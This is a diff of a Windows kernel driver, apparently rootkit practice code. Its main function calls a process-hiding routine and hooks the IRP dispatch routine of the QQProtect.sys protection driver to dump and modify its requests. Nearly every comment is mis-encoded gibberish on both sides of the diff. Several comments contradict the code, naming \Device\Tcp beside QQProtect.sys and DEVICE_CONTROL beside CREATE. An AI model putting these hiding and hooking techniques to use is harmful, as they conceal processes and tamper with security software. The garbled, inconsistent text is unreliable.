-// ´Ë¿Ì¾Í»áÏò I/O ¹ÜÀíÆ÷ÇëÇó´´½¨ IRP_MJ_CREATE IRP£¬×îÖÕ´«µİµ½´ËÀı³ÌÖĞ´¦Àí£¬¿ÉÒÔÔÚ´ËÀı³ÌÖĞ¼ÓÈëÈí¼ş¶Ïµã£¬µ÷ÊÔ¼ì²é´«ÈëµÄ IRP£¬
-// »òÕßÒÔ±à³Ì·½Ê½¼ì²éÒ²ĞĞ
+//å¦‚æœæˆ‘ä»¬ç”¨æ­¤ä¾‹ç¨‹é’©ä½äº†QQProtect.sys çš„ IRP_MJ_CREATE åˆ†å‘ä¾‹ç¨‹ï¼Œé‚£ä¹ˆè¦å¦‚ä½•è§¦å‘å¯¹åº”çš„ IRP é€åˆ°æˆ‘ä»¬è¿™å¤„ç†å‘¢ï¼Ÿ
+// å¦‚æœç³»ç»Ÿä¸Šè¿è¡Œç€ QQProtect.exe ï¼Œå°†å…¶å…³é—­ï¼Œç„¶åå¯åŠ¨ qq.exe ä¸»è¿›ç¨‹ï¼Œåè€…ä¼šæ£€æµ‹å‰è€…æ˜¯å¦å­˜åœ¨ï¼Œå¦‚æœæ²¡æœ‰å°±ä¼šåˆ›å»º QQProtect.exe
+// æ­¤åˆ»å°±ä¼šå‘ I/O ç®¡ç†å™¨è¯·æ±‚åˆ›å»º IRP_MJ_CREATE IRPï¼Œæœ€ç»ˆä¼ é€’åˆ°æ­¤ä¾‹ç¨‹ä¸­å¤„ç†ï¼Œå¯ä»¥åœ¨æ­¤ä¾‹ç¨‹ä¸­åŠ å…¥è½¯ä»¶æ–­ç‚¹ï¼Œè°ƒè¯•æ£€æŸ¥ä¼ å…¥çš„ IRPï¼Œ
+// æˆ–è€…ä»¥ç¼–ç¨‹æ–¹å¼æ£€æŸ¥ä¹Ÿè¡Œ
 NTSTATUS InterceptAndInspectOthersIRP(IN PDEVICE_OBJECT DeviceObject, IN PIRP Irp){
 
 	PIO_COMPLETION_ROUTINE original_completion_routine;
 	PIO_STACK_LOCATION check_target_irp_Stack;
 	ULONG ioctrlcode;
 
-	DBG_TRACE("InterceptAndInspectOthersIRP",  "Get an IRP destined to original driver£¬now we can dump and modify it");
+	DBG_TRACE("InterceptAndInspectOthersIRP",  "Get an IRP destined to original driverï¼Œnow we can dump and modify it");
 
-	// ´Ë´¦½øĞĞ×ª´¢£¨¶ÁÈ¡£©ÒÔ¼°ĞŞ¸Ä IRP µÄ¹¤×÷£¬¿É²Î¿¼ dispatchIOControl() ÖĞ²Ù×İ IRP µÄÂß¼­£¬µ«×¢Òâ±Ü¿ªÉè±¸Õ»¹²ÏíµÄÄÇĞ©¹Ø¼ü×Ö¶Î
+	// æ­¤å¤„è¿›è¡Œè½¬å‚¨ï¼ˆè¯»å–ï¼‰ä»¥åŠä¿®æ”¹ IRP çš„å·¥ä½œï¼Œå¯å‚è€ƒ dispatchIOControl() ä¸­æ“çºµ IRP çš„é€»è¾‘ï¼Œä½†æ³¨æ„é¿å¼€è®¾å¤‡æ ˆå…±äº«çš„é‚£äº›å…³é”®å­—æ®µ
 	
 	
-	// ÎªÁËÎÈ¶¨ĞÔ£¬Ò»°ãÎÒÃÇ£¨Çı¶¯³ÌĞò£©Ö»²Ù×İÄ³Éè±¸¶ÔÏó×¨ÓÃµÄ IO_STACK_LOCATION ½á¹¹£»¶ø I/O ¹ÜÀíÆ÷±ÈÇı¶¯¸üÇå³ş IRP ÖĞ¸÷×Ö¶Î
-	// µÄÓÃÍ¾£¬Òò´ËÊ×ÏÈ
-	// »ñÈ¡ I/O ¹ÜÀíÆ÷°Ñ IRP ´«µİ¸øÇı¶¯³ÌĞò tdx.sys ´´½¨µÄÉè±¸¶ÔÏó \Device\Tcp Ê±£¬¸ÃÉè±¸×¨ÓÃµÄ IO_STACK_LOCATION£¬
-	// Êµ¼ÊÉÏ£¬\Device\Tcp  ËùÔÚµÄÉè±¸Õ»ÖĞ£¬Ö»ÓĞÒ»¸öÉè±¸£¬Òà¼´  \Device\Tcp £º
+	// ä¸ºäº†ç¨³å®šæ€§ï¼Œä¸€èˆ¬æˆ‘ä»¬ï¼ˆé©±åŠ¨ç¨‹åºï¼‰åªæ“çºµæŸè®¾å¤‡å¯¹è±¡ä¸“ç”¨çš„ IO_STACK_LOCATION ç»“æ„ï¼›è€Œ I/O ç®¡ç†å™¨æ¯”é©±åŠ¨æ›´æ¸…æ¥š IRP ä¸­å„å­—æ®µ
+	// çš„ç”¨é€”ï¼Œå› æ­¤é¦–å…ˆ
+	// è·å– I/O ç®¡ç†å™¨æŠŠ IRP ä¼ é€’ç»™é©±åŠ¨ç¨‹åº tdx.sys åˆ›å»ºçš„è®¾å¤‡å¯¹è±¡ \Device\Tcp æ—¶ï¼Œè¯¥è®¾å¤‡ä¸“ç”¨çš„ IO_STACK_LOCATIONï¼Œ
+	// å®é™…ä¸Šï¼Œ\Device\Tcp  æ‰€åœ¨çš„è®¾å¤‡æ ˆä¸­ï¼Œåªæœ‰ä¸€ä¸ªè®¾å¤‡ï¼Œäº¦å³  \Device\Tcp ï¼š
 	//kd> !devstack  \Device\Tcp
 	//!DevObj   !DrvObj            !DevExt   ObjectName
 	//> 866b96b0  \Driver\tdx        866b9768  Tcp
@@ -455,22 +461,22 @@ NTSTATUS InterceptAndInspectOthersIRP(IN PDEVICE_OBJECT DeviceObject, IN PIRP Ir
 	
 	check_target_irp_Stack = IoGetCurrentIrpStackLocation(Irp);
 	
-	//ÔÙ´ÎÈ·±£ÎÒÃÇ¹³×¡²¢´¦ÀíµÄ IRP ÀàĞÍÎª IRP_MJ_DEVICE_CONTROL
+	//å†æ¬¡ç¡®ä¿æˆ‘ä»¬é’©ä½å¹¶å¤„ç†çš„ IRP ç±»å‹ä¸º IRP_MJ_DEVICE_CONTROL
 	if (check_target_irp_Stack->MajorFunction != IRP_MJ_CREATE) {
 
 		return (!STATUS_SUCCESS);
 
 	}
 
-	//ÈçÇ°ËùÊö£¬¸É¾»ÏµÍ³ÖĞ£¬Éè±¸¶ÔÏó \Device\Tcp ËùÔÚµÄÉè±¸Õ»ÖĞÖ»ÓĞËü×Ô¼º£¬ÏÂÃæÑéÖ¤£¨DeviceObject.AttachedDevice Îª¹ÒÔØµ½ 
-	// \Device\Tcp µÄÉè±¸£¬ËüÓ¦¸ÃÎª¿Õ£©
+	//å¦‚å‰æ‰€è¿°ï¼Œå¹²å‡€ç³»ç»Ÿä¸­ï¼Œè®¾å¤‡å¯¹è±¡ \Device\Tcp æ‰€åœ¨çš„è®¾å¤‡æ ˆä¸­åªæœ‰å®ƒè‡ªå·±ï¼Œä¸‹é¢éªŒè¯ï¼ˆDeviceObject.AttachedDevice ä¸ºæŒ‚è½½åˆ° 
+	// \Device\Tcp çš„è®¾å¤‡ï¼Œå®ƒåº”è¯¥ä¸ºç©ºï¼‰
 	if( check_target_irp_Stack->DeviceObject->AttachedDevice == NULL ){
 		
 		DBG_TRACE("InterceptAndInspectOthersIRP",  "we have no others rootkit monitoring QQProtect.sys's devStack !");
 	
 	}
 
-	//Èç¹û´æÔÚ  \Device\Tcp Éè±¸¶ÔÏóµÄÍê³ÉÀı³Ì£¬ÔòÆä´òÓ¡µØÖ·£¬ÒÔ·½±ãºóĞøÔÚµ÷ÊÔÆ÷ÖĞ·´»ã±à¸Ãº¯Êı
+	//å¦‚æœå­˜åœ¨  \Device\Tcp è®¾å¤‡å¯¹è±¡çš„å®Œæˆä¾‹ç¨‹ï¼Œåˆ™å…¶æ‰“å°åœ°å€ï¼Œä»¥æ–¹ä¾¿åç»­åœ¨è°ƒè¯•å™¨ä¸­åæ±‡ç¼–è¯¥å‡½æ•°
 	if ( (original_completion_routine = check_target_irp_Stack->CompletionRoutine) != NULL ) {
 	
 		DBG_PRINT2("[InterceptAndInspectOthersIRP]: address of IO_STACK_LOCATION.Completion Routine is:  %p\n", original_completion_routine);
@@ -481,10 +487,10 @@ NTSTATUS InterceptAndInspectOthersIRP(IN PDEVICE_OBJECT DeviceObject, IN PIRP Ir
 		DBG_TRACE("InterceptAndInspectOthersIRP", "the QQProtect.sys doesn't supply a Completion Routine to its device object!");
 	}
 
-	// ÒòÎªÎÒÃÇ hooked µÄÊÇ´«µİ¸ø \Device\Tcp Éè±¸¶ÔÏóµÄ IRP_MJ_DEVICE_CONTROL ÀàĞÍ IRP£¬ËùÒÔĞèÒª¼ì²é¾ßÌåµÄ I/O ¿ØÖÆÂë£¬È»ºó½øĞĞ
-	// ÏàÓ¦µÄ²Ù×÷£º IO_STACK_LOCATION.Parameters.DeviceIoControl ×Ö¶Î×¨ÓÃÓÚ¼ÇÂ¼ IRP_MJ_DEVICE_CONTROL ÀàĞÍ IRP µÄÏà¹ØĞÅÏ¢
-	// ÀàËÆµØ£¬Èç¹û IRP µÄÀàĞÍÎª IRP_MJ_WRITE£¬Ôò IO_STACK_LOCATION.Parameters ×Ö¶ÎÏÂµÄÁªºÏ½«±» I/O ¹ÜÀíÆ÷³õÊ¼»¯Îª Write
-	// »»ÑÔÖ®£¬I/O ¹ÜÀíÆ÷¸ù¾İ IRP µÄÀàĞÍÀ´³õÊ¼»¯ IO_STACK_LOCATION.Parameters ÏÂµÄÁªºÏ
+	// å› ä¸ºæˆ‘ä»¬ hooked çš„æ˜¯ä¼ é€’ç»™ \Device\Tcp è®¾å¤‡å¯¹è±¡çš„ IRP_MJ_DEVICE_CONTROL ç±»å‹ IRPï¼Œæ‰€ä»¥éœ€è¦æ£€æŸ¥å…·ä½“çš„ I/O æ§åˆ¶ç ï¼Œç„¶åè¿›è¡Œ
+	// ç›¸åº”çš„æ“ä½œï¼š IO_STACK_LOCATION.Parameters.DeviceIoControl å­—æ®µä¸“ç”¨äºè®°å½• IRP_MJ_DEVICE_CONTROL ç±»å‹ IRP çš„ç›¸å…³ä¿¡æ¯
+	// ç±»ä¼¼åœ°ï¼Œå¦‚æœ IRP çš„ç±»å‹ä¸º IRP_MJ_WRITEï¼Œåˆ™ IO_STACK_LOCATION.Parameters å­—æ®µä¸‹çš„è”åˆå°†è¢« I/O ç®¡ç†å™¨åˆå§‹åŒ–ä¸º Write
+	// æ¢è¨€ä¹‹ï¼ŒI/O ç®¡ç†å™¨æ ¹æ® IRP çš„ç±»å‹æ¥åˆå§‹åŒ– IO_STACK_LOCATION.Parameters ä¸‹çš„è”åˆ
 
 	
 	ioctrlcode = (*check_target_irp_Stack).Parameters.DeviceIoControl.IoControlCode;
@@ -493,8 +499,8 @@ NTSTATUS InterceptAndInspectOthersIRP(IN PDEVICE_OBJECT DeviceObject, IN PIRP Ir
 
 	DBG_TRACE("InterceptAndInspectOthersIRP",  "forward IRP to the original dispatch routine, to guarantee system work correctly");
 
-	// Í¨¹ıº¯ÊıÖ¸Õëµ÷ÓÃÔ­Ê¼·Ö·¢Àı³Ì£¬×ª·¢¸øËü½øĞĞ´¦Àí£¬ÒÔÈ·±£ÏµÍ³ÄÜ¹»Õı³£¹¤×÷£¬ÒòÎªÎÒÃÇµÄ¹³×ÓÀı³Ì´¦ÀíÄ¿±ê IRP µÄ·½Ê½
-	// Èç¹ûÊÇÏµÍ³£¬Éè±¸Õ»ÖĞ·Ö·¢Àı³Ì·ÇÔ¤ÆÚµÄ£¬¾Í¿ÉÄÜÔì³ÉÏµÍ³±ÀÀ£
+	// é€šè¿‡å‡½æ•°æŒ‡é’ˆè°ƒç”¨åŸå§‹åˆ†å‘ä¾‹ç¨‹ï¼Œè½¬å‘ç»™å®ƒè¿›è¡Œå¤„ç†ï¼Œä»¥ç¡®ä¿ç³»ç»Ÿèƒ½å¤Ÿæ­£å¸¸å·¥ä½œï¼Œå› ä¸ºæˆ‘ä»¬çš„é’©å­ä¾‹ç¨‹å¤„ç†ç›®æ ‡ IRP çš„æ–¹å¼
+	// å¦‚æœæ˜¯ç³»ç»Ÿï¼Œè®¾å¤‡æ ˆä¸­åˆ†å‘ä¾‹ç¨‹éé¢„æœŸçš„ï¼Œå°±å¯èƒ½é€ æˆç³»ç»Ÿå´©æºƒ
 
 	return ( ori_dispt_ptr(DeviceObject, Irp) );
 
@@ -505,17 +511,17 @@ NTSTATUS InterceptAndInspectOthersIRP(IN PDEVICE_OBJECT DeviceObject, IN PIRP Ir
 
 
 /*
-* DriverObjectÏàµ±ÓÚ×¢²áµÄÇı¶¯£¬DeviceObjectÎª¶ÔÓ¦Ä³¸öÇı¶¯Éè±¸
-* Ò»¸öÇı¶¯¿ÉÒÔ´´½¨¶à¸öÉè±¸£¬È»ºóÍ¨¹ıDriverObject::DeviceObjectºÍ
-* DeviceObject::NextDevice±éÀúÕû¸öÉè±¸Á´±í
+* DriverObjectç›¸å½“äºæ³¨å†Œçš„é©±åŠ¨ï¼ŒDeviceObjectä¸ºå¯¹åº”æŸä¸ªé©±åŠ¨è®¾å¤‡
+* ä¸€ä¸ªé©±åŠ¨å¯ä»¥åˆ›å»ºå¤šä¸ªè®¾å¤‡ï¼Œç„¶åé€šè¿‡DriverObject::DeviceObjectå’Œ
+* DeviceObject::NextDeviceéå†æ•´ä¸ªè®¾å¤‡é“¾è¡¨
 */
 NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath)
 {
-	//ÒòÎª DriverEntry() ÔËĞĞÔÚ PASSIVE_LEVEL ÖĞ¶Ï¼¶£¬ËùÓĞÖ»ÄÜÔÚ PASSIVE_LEVEL µ÷ÓÃµÄÄÚºËÀı³Ì¶¼Ó¦¸Ã·ÅÔÚ DriverEntry()
-	//ÄÚ²¿µ÷ÓÃ£¬°üÀ¨Ê¹ÓÃ DbgPrint() ´òÓ¡ unicode ×Ö·û´®Ê±
-	// »¹ĞèÈ·ÈÏÔ­×Ó²Ù×÷ InterLockedAndExchange() ÊÇ·ñÖ»ÄÜÔÚ PASSIVE_LEVEL IRQL ÉÏµ÷ÓÃ
-	//  WDK ÖĞ¶¨ÒåµÄ²¿·ÖÊı¾İÀàĞÍÓë´«Í³ C ±ê×¼µÄÊı¾İÀàĞÍ¶ÔÓ¦¹ØÏµÈçÏÂ£º
-	// ¼ì²éÕâĞ©ÀàĞÍ¶¨ÒåÊÇÍ¨¹ı #define »¹ÊÇ typedef ÊµÏÖ
+	//å› ä¸º DriverEntry() è¿è¡Œåœ¨ PASSIVE_LEVEL ä¸­æ–­çº§ï¼Œæ‰€æœ‰åªèƒ½åœ¨ PASSIVE_LEVEL è°ƒç”¨çš„å†…æ ¸ä¾‹ç¨‹éƒ½åº”è¯¥æ”¾åœ¨ DriverEntry()
+	//å†…éƒ¨è°ƒç”¨ï¼ŒåŒ…æ‹¬ä½¿ç”¨ DbgPrint() æ‰“å° unicode å­—ç¬¦ä¸²æ—¶
+	// è¿˜éœ€ç¡®è®¤åŸå­æ“ä½œ InterLockedAndExchange() æ˜¯å¦åªèƒ½åœ¨ PASSIVE_LEVEL IRQL ä¸Šè°ƒç”¨
+	//  WDK ä¸­å®šä¹‰çš„éƒ¨åˆ†æ•°æ®ç±»å‹ä¸ä¼ ç»Ÿ C æ ‡å‡†çš„æ•°æ®ç±»å‹å¯¹åº”å…³ç³»å¦‚ä¸‹ï¼š
+	// æ£€æŸ¥è¿™äº›ç±»å‹å®šä¹‰æ˜¯é€šè¿‡ #define è¿˜æ˜¯ typedef å®ç°
 	// ULONG -> unsigned long
 	// UCHAR -> unsigned char
 	// UINT -> unsigned int
@@ -527,15 +533,15 @@ NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath)
 
 	
 	LARGE_INTEGER clock_interval_count_since_booted;
-	//ËùÓĞµÄÄÚ²¿±äÁ¿¶¼±ØĞëÊ×ÏÈ¶¨Òå
-	int i;						//Õâ¸ö±ØĞë·ÅÔÚ×îÇ°Ãæ£¬·ñÔòÎŞ·¨Í¨¹ı±àÒë
+	//æ‰€æœ‰çš„å†…éƒ¨å˜é‡éƒ½å¿…é¡»é¦–å…ˆå®šä¹‰
+	int i;						//è¿™ä¸ªå¿…é¡»æ”¾åœ¨æœ€å‰é¢ï¼Œå¦åˆ™æ— æ³•é€šè¿‡ç¼–è¯‘
 	ULONG  millsecond_count_per_clock;
 	ULONG  l00nanosecond_count_per_clock;
-	NTSTATUS  ntStatus;	//Õâ¸ö±ØĞë·ÅÔÚ×îÇ°Ãæ£¬·ñÔòÎŞ·¨Í¨¹ı±àÒë
+	NTSTATUS  ntStatus;	//è¿™ä¸ªå¿…é¡»æ”¾åœ¨æœ€å‰é¢ï¼Œå¦åˆ™æ— æ³•é€šè¿‡ç¼–è¯‘
 	ULONG  data_length;
 	HANDLE  my_key_handle = NULL;
 	NTSTATUS  returnedStatus;
-	NTSTATUS  hooked_result;		//±£´æÎÒÃÇµÄ¹Ò¹³Àı³ÌµÄÖ´ĞĞ½á¹û
+	NTSTATUS  hooked_result;		//ä¿å­˜æˆ‘ä»¬çš„æŒ‚é’©ä¾‹ç¨‹çš„æ‰§è¡Œç»“æœ
 
 	UNICODE_STRING  my_key_path = RTL_CONSTANT_STRING(L"\\Registry\\Machine\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion");
 	UNICODE_STRING  my_key_name = RTL_CONSTANT_STRING(L"SystemRoot");
@@ -585,7 +591,7 @@ NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath)
 	else {
 		DBG_TRACE("Driver Entry", ".................query registry key value failed......................");
 	}
-	//×¢Òâ£¬DbgPrint Àı³Ì²»Ö§³ÖÈÎºÎ¸¡µãÀàĞÍ£¨%f¡¢%e¡¢%E¡¢%g¡¢%G¡¢%a »ò %A£©£¬Òò´Ë´òÓ¡¸¡µãÊı»áÔì³ÉÏµÍ³±ÀÀ£
+	//æ³¨æ„ï¼ŒDbgPrint ä¾‹ç¨‹ä¸æ”¯æŒä»»ä½•æµ®ç‚¹ç±»å‹ï¼ˆ%fã€%eã€%Eã€%gã€%Gã€%a æˆ– %Aï¼‰ï¼Œå› æ­¤æ‰“å°æµ®ç‚¹æ•°ä¼šé€ æˆç³»ç»Ÿå´©æºƒ
 	l00nanosecond_count_per_clock = KeQueryTimeIncrement();
 	millsecond_count_per_clock = l00nanosecond_count_per_clock / 10000;
 	DbgPrint("................per system clock interval is   %u   100nanoseconds................", l00nanosecond_count_per_clock);
@@ -594,7 +600,7 @@ NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath)
 	KeQueryTickCount(&clock_interval_count_since_booted);
 	DbgPrint(".............  the system clock interval count since booted is   %u  times  ...................", clock_interval_count_since_booted.LowPart);
 	DbgPrint(".............  the higher 4 bytes of clock_interval_count_since_booted is   %i  times  ...................", clock_interval_count_since_booted.HighPart);
-	//ÏµÍ³ÖĞ¶Ï´ÎÊı³ËÒÔÃ¿ÖĞ¶ÏµÄºÁÃëÊı¾ÍµÃµ½Æô¶¯ÒÔÀ´¾­ÀúµÄºÁÃëÊı
+	//ç³»ç»Ÿä¸­æ–­æ¬¡æ•°ä¹˜ä»¥æ¯ä¸­æ–­çš„æ¯«ç§’æ•°å°±å¾—åˆ°å¯åŠ¨ä»¥æ¥ç»å†çš„æ¯«ç§’æ•°
 
 
 	HideProcessWithName(target_hide_process_name);
@@ -602,34 +608,34 @@ NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath)
 	DBG_TRACE("Driver Entry", "Driver has benn loaded");
 	for (i = 0; i<IRP_MJ_MAXIMUM_FUNCTION; i++)
 	{
-		//ÒòÎª¶¨Òå _DRIVER_OBJECT.MajorFunction : [28] Ptr32 to     long
-		// ËùÒÔË÷Òı´Ó 0µ½27£¨IRP_MJ_MAXIMUM_FUNCTION£©
+		//å› ä¸ºå®šä¹‰ _DRIVER_OBJECT.MajorFunction : [28] Ptr32 to     long
+		// æ‰€ä»¥ç´¢å¼•ä» 0åˆ°27ï¼ˆIRP_MJ_MAXIMUM_FUNCTIONï¼‰
 
-		// ²ÎÊı¶¨ÒåÎª PDRIVER_OBJECT DriverObject£¬ËùÒÔ½âÒıÓÃÈ¡µÃ DRIVER_OBJECT
+		// å‚æ•°å®šä¹‰ä¸º PDRIVER_OBJECT DriverObjectï¼Œæ‰€ä»¥è§£å¼•ç”¨å–å¾— DRIVER_OBJECT
 		
 		(*DriverObject).MajorFunction[i] = defaultDispatch;
 		
-		// µÈ¼ÛÓÚ	
+		// ç­‰ä»·äº	
 		//DriverObject->MajorFunction[i]
 	}
 
-	//µÈ¼ÛÓÚ DriverObject->MajorFunction[14] = dispatchIOControl;
-	// °ÑdispatchIOControl()×¢²áÎª´¦ÀíÉè±¸¿ØÖÆÀà IRP µÄÀı³Ì
+	//ç­‰ä»·äº DriverObject->MajorFunction[14] = dispatchIOControl;
+	// æŠŠdispatchIOControl()æ³¨å†Œä¸ºå¤„ç†è®¾å¤‡æ§åˆ¶ç±» IRP çš„ä¾‹ç¨‹
 	(*DriverObject).MajorFunction[IRP_MJ_DEVICE_CONTROL] = dispatchIOControl;
 	(*DriverObject).DriverUnload = Unload;
 
 
-	//MajorFunction[IRP_MJ_READ]  µÈÓÚ MajorFunction[3] £¬Õâ¸öÀı³ÌÔ¤ÆÚÒª´¦Àí¡°¶ÁÇëÇó¡±ÀàĞÍµÄ IRP¡ª¡ª  
-	// I/O ¹ÜÀíÆ÷ÎªÏòÏÂ´«µİµÄ IRP ·ÖÅä¹¦ÄÜ´úÂëÎª IRP_MJ_READ£¬¸Ã IRP ´øÓĞÒ»¸ö¿Õ»º³åÇø£¬Ìá¹©¸øÇı¶¯³ÌĞò°Ñ´ÓÉè±¸ÖĞ¶ÁÈ¡µÄÊı¾İ·ÅÔÚ
-	// ÀïÃæ£¬ Òò´Ë _DRIVER_OBJECT.MajorFunction[3] Ò»°ã±»³õÊ¼»¯Îª´¦Àí¶ÁÇëÇó IRP µÄÀı³Ì
-	// ÀàËÆµØ£¬_DRIVER_OBJECT.MajorFunction[4] Ò²¾ÍÊÇ MajorFunction[IRP_MJ_WRITE] Ò»°ã±»³õÊ¼»¯Îª´¦ÀíĞ´ÇëÇó IRP £¨IRP_MJ_WRITE£©
-	// µÄÀı³Ì£¬´ËÊ± I/O ¹ÜÀíÆ÷´«µİµÄ IRP »º³åÇøÄÚ°üº¬Êı¾İ£¬ÒÔÇëÇóÇı¶¯³ÌĞòÏòÉè±¸Ğ´Èë 
+	//MajorFunction[IRP_MJ_READ]  ç­‰äº MajorFunction[3] ï¼Œè¿™ä¸ªä¾‹ç¨‹é¢„æœŸè¦å¤„ç†â€œè¯»è¯·æ±‚â€ç±»å‹çš„ IRPâ€”â€”  
+	// I/O ç®¡ç†å™¨ä¸ºå‘ä¸‹ä¼ é€’çš„ IRP åˆ†é…åŠŸèƒ½ä»£ç ä¸º IRP_MJ_READï¼Œè¯¥ IRP å¸¦æœ‰ä¸€ä¸ªç©ºç¼“å†²åŒºï¼Œæä¾›ç»™é©±åŠ¨ç¨‹åºæŠŠä»è®¾å¤‡ä¸­è¯»å–çš„æ•°æ®æ”¾åœ¨
+	// é‡Œé¢ï¼Œ å› æ­¤ _DRIVER_OBJECT.MajorFunction[3] ä¸€èˆ¬è¢«åˆå§‹åŒ–ä¸ºå¤„ç†è¯»è¯·æ±‚ IRP çš„ä¾‹ç¨‹
+	// ç±»ä¼¼åœ°ï¼Œ_DRIVER_OBJECT.MajorFunction[4] ä¹Ÿå°±æ˜¯ MajorFunction[IRP_MJ_WRITE] ä¸€èˆ¬è¢«åˆå§‹åŒ–ä¸ºå¤„ç†å†™è¯·æ±‚ IRP ï¼ˆIRP_MJ_WRITEï¼‰
+	// çš„ä¾‹ç¨‹ï¼Œæ­¤æ—¶ I/O ç®¡ç†å™¨ä¼ é€’çš„ IRP ç¼“å†²åŒºå†…åŒ…å«æ•°æ®ï¼Œä»¥è¯·æ±‚é©±åŠ¨ç¨‹åºå‘è®¾å¤‡å†™å…¥ 
 
-	//Ç°ÃæÏÈ³õÊ¼»¯×Ô¼ºµÄ IRP ·Ö·¢Àı³Ì±í£¬È»ºó¹Ò¹³ÎÒÃÇ¸ĞĞËÈ¤µÄÆäËüÇı¶¯µÄ IRP ·Ö·¢Àı³Ì±í
+	//å‰é¢å…ˆåˆå§‹åŒ–è‡ªå·±çš„ IRP åˆ†å‘ä¾‹ç¨‹è¡¨ï¼Œç„¶åæŒ‚é’©æˆ‘ä»¬æ„Ÿå…´è¶£çš„å…¶å®ƒé©±åŠ¨çš„ IRP åˆ†å‘ä¾‹ç¨‹è¡¨
 
 	hooked_result = ReferenceDeviceAndHookIRPdispatchRoutine();
 
-	// ¹Ò¹³Ê§°Ü£¬Ôò´òÓ¡ĞÅÏ¢
+	// æŒ‚é’©å¤±è´¥ï¼Œåˆ™æ‰“å°ä¿¡æ¯
 
 	if( !NT_SUCCESS(hooked_result) ){
 
@@ -656,7 +662,7 @@ NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath)
 	return STATUS_SUCCESS;
 }
 /*
-* IRP.IoStatus : ÀàĞÍÎªIO_STATUS_BLOCK
+* IRP.IoStatus : ç±»å‹ä¸ºIO_STATUS_BLOCK
 * A driver sets an IRP's I/O status block to indicate the final status of
 * an I/O request, before calling IoCompleteRequest for the IRP.
 typedef struct _IO_STATUS_BLOCK {
@@ -692,15 +698,15 @@ NTSTATUS defaultDispatch(IN PDEVICE_OBJECT DeviceObject, IN PIRP IRP)
 	return (STATUS_SUCCESS);
 }
 /*
-* I/O¶ÑÕ»µ¥ÔªÓÉIO_STACK_LOCATION¶¨Òå£¬Ã¿Ò»¸ö¶ÑÕ»µ¥Ôª¶¼¶ÔÓ¦Ò»¸öÉè±¸¶ÔÏó¡£
-* ÎÒÃÇÖªµÀ£¬ÔÚÒ»¸öÇı¶¯³ÌĞòÖĞ£¬¿ÉÒÔ´´½¨Ò»¸ö»ò¶à¸öÉè±¸¶ÔÏó£¬¶øÕâĞ©Éè±¸¶ÔÏó
-* ¶¼¶ÔÓ¦×ÅÒ»¸öIO_STACK_LOCATION½á¹¹Ìå£¬¶øÔÚÇı¶¯³ÌĞòÖĞµÄ¶à¸öÉè±¸¶ÔÏó£¬¶ø
-* ÕâĞ©Éè±¸¶ÔÏóÖ®¼äµÄ¹ØÏµÎªË®Æ½²ã´Î¹ØÏµ¡£
-* Parameters ÎªÃ¿¸öÀàĞÍµÄ request Ìá¹©²ÎÊı£¬ÀıÈç£ºCreate(IRP_MJ_CREATE ÇëÇó£©£¬
-* Read£¨IRP_MJ_READ ÇëÇó£©£¬StartDevice£¨IRP_MJ_PNP µÄ×ÓÀà IRP_MN_START_DEVICE£©
+* I/Oå †æ ˆå•å…ƒç”±IO_STACK_LOCATIONå®šä¹‰ï¼Œæ¯ä¸€ä¸ªå †æ ˆå•å…ƒéƒ½å¯¹åº”ä¸€ä¸ªè®¾å¤‡å¯¹è±¡ã€‚
+* æˆ‘ä»¬çŸ¥é“ï¼Œåœ¨ä¸€ä¸ªé©±åŠ¨ç¨‹åºä¸­ï¼Œå¯ä»¥åˆ›å»ºä¸€ä¸ªæˆ–å¤šä¸ªè®¾å¤‡å¯¹è±¡ï¼Œè€Œè¿™äº›è®¾å¤‡å¯¹è±¡
+* éƒ½å¯¹åº”ç€ä¸€ä¸ªIO_STACK_LOCATIONç»“æ„ä½“ï¼Œè€Œåœ¨é©±åŠ¨ç¨‹åºä¸­çš„å¤šä¸ªè®¾å¤‡å¯¹è±¡ï¼Œè€Œ
+* è¿™äº›è®¾å¤‡å¯¹è±¡ä¹‹é—´çš„å…³ç³»ä¸ºæ°´å¹³å±‚æ¬¡å…³ç³»ã€‚
+* Parameters ä¸ºæ¯ä¸ªç±»å‹çš„ request æä¾›å‚æ•°ï¼Œä¾‹å¦‚ï¼šCreate(IRP_MJ_CREATE è¯·æ±‚ï¼‰ï¼Œ
+* Readï¼ˆIRP_MJ_READ è¯·æ±‚ï¼‰ï¼ŒStartDeviceï¼ˆIRP_MJ_PNP çš„å­ç±» IRP_MN_START_DEVICEï¼‰
 *
 //
-// NtDeviceIoControlFile ²ÎÊı
+// NtDeviceIoControlFile å‚æ•°
 //
 struct
 {
@@ -709,9 +715,9 @@ ULONG POINTER_ALIGNMENT InputBufferLength;
 ULONG POINTER_ALIGNMENT IoControlCode;
 PVOID Type3InputBuffer;
 } DeviceIoControl;
-ÔÚDriverEntryº¯ÊıÖĞ£¬ÎÒÃÇÉèÖÃdispatchIOControl´¦ÀíIRP_MJ_DEVICE_CONTROL
-ÀàĞÍµÄÇëÇó£¬Òò´ËÔÚdispatchIOControlÖĞ£¬ÎÒÃÇÖ»¹ØĞÄIOCTLÇëÇó£¬ParametersÖĞ
-Ö»°üº¬DeviceIoControl³ÉÔ±
+åœ¨DriverEntryå‡½æ•°ä¸­ï¼Œæˆ‘ä»¬è®¾ç½®dispatchIOControlå¤„ç†IRP_MJ_DEVICE_CONTROL
+ç±»å‹çš„è¯·æ±‚ï¼Œå› æ­¤åœ¨dispatchIOControlä¸­ï¼Œæˆ‘ä»¬åªå…³å¿ƒIOCTLè¯·æ±‚ï¼ŒParametersä¸­
+åªåŒ…å«DeviceIoControlæˆå‘˜
 */
 
 
@@ -750,7 +756,7 @@ NTSTATUS dispatchIOControl(IN PDEVICE_OBJECT DeviceObject, IN PIRP IRP)
 	}
 	break;
 	}
-	/* ÔÚ´¦ÀíÍêÇëÇóºó£¬µ÷ÓÃIoCompleteRequest */
+	/* åœ¨å¤„ç†å®Œè¯·æ±‚åï¼Œè°ƒç”¨IoCompleteRequest */
 	IoCompleteRequest(IRP, IO_NO_INCREMENT);
 	return(ntStatus);
 }
